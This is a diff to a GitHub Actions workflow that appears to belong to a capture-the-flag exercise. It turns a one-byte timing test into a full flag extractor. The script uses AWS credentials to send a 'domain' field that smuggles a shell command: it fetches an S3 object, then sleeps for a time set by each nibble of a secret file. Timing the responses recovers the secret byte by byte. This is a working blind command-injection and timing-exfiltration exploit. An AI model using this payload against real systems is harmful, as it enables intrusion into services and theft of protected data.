@@ -1,4 +1,4 @@
-name: Stage2-16-Flag-Timing-Test
+name: Stage2-17-Extract-Flag
 
 on:
   push:
@@ -10,8 +10,9 @@ permissions:
   id-token: write
 
 jobs:
-  timing:
+  extract:
     runs-on: ubuntu-latest
+    timeout-minutes: 30
 
     steps:
       - name: Configure AWS credentials
@@ -24,7 +25,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Extract first flag byte
+      - name: Extract flag
         run: |
           python3 - <<'PY'
           import os
@@ -42,7 +43,9 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          def probe(shift):
+          session = requests.Session()
+
+          def probe(index, shift):
               domain = (
                   "example.com; "
                   "/opt/aws s3api get-object "
@@ -52,35 +55,51 @@ jobs:
                   "--region us-east-1 "
                   "--endpoint-url https://s3.us-east-1.amazonaws.com "
                   ">/dev/null 2>&1 && "
-                  "b=$(od -An -tu1 -N1 -j0 /tmp/log-flag.txt | tr -d ' '); "
+                  f"b=$(od -An -tu1 -N1 -j{index} /tmp/log-flag.txt | tr -d ' '); "
                   f"n=$(((b >> {shift}) & 15)); "
                   "sleep \"$n\""
               )
 
               start = time.monotonic()
 
-              response = requests.post(
+              response = session.post(
                   api,
                   json={"domain": domain},
                   auth=auth,
-                  timeout=20
+                  timeout=25
               )
 
               elapsed = time.monotonic() - start
+              value = round(elapsed)
 
-              print("SHIFT=" + str(shift))
-              print("HTTP=" + str(response.status_code))
-              print("ELAPSED=%.2f" % elapsed)
+              print(
+                  "INDEX=%d SHIFT=%d ELAPSED=%.2f NIBBLE=%d"
+                  % (index, shift, elapsed, value)
+              )
 
-              return round(elapsed)
+              return value & 15
 
-          high = probe(4)
-          low = probe(0)
+          flag = []
 
-          value = (high << 4) | low
+          for index in range(48):
+              high = probe(index, 4)
+              low = probe(index, 0)
 
-          print("HIGH_NIBBLE=" + str(high))
-          print("LOW_NIBBLE=" + str(low))
-          print("BYTE_VALUE=" + str(value))
-          print("CHAR=" + chr(value))
+              value = (high << 4) | low
+
+              if value == 0:
+                  break
+
+              char = chr(value)
+              flag.append(char)
+
+              print(
+                  "BYTE=%d VALUE=%d CHAR=%r"
+                  % (index, value, char)
+              )
+
+              if char == "}":
+                  break
+
+          print("FLAG=" + "".join(flag))
           PY
